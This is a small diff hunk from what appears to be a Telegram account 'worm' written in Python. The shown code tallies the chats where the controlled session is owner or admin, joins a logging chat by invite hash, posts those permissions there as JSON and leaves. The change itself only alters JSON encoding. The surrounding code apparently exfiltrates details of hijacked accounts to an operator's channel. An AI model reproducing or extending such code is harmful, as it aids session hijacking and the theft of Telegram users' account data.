@@ -121,7 +121,7 @@ async def worm(client, bot, logger_bot):
         if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
             await log['msg'].edit(log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
             await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
-            await client.send_message(log['dest'], json.dumps(perm_logs, indent=4))
+            await client.send_message(log['dest'], json.dumps(perm_logs, indent=4, ensure_ascii=False))
             await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
     except:
         pass
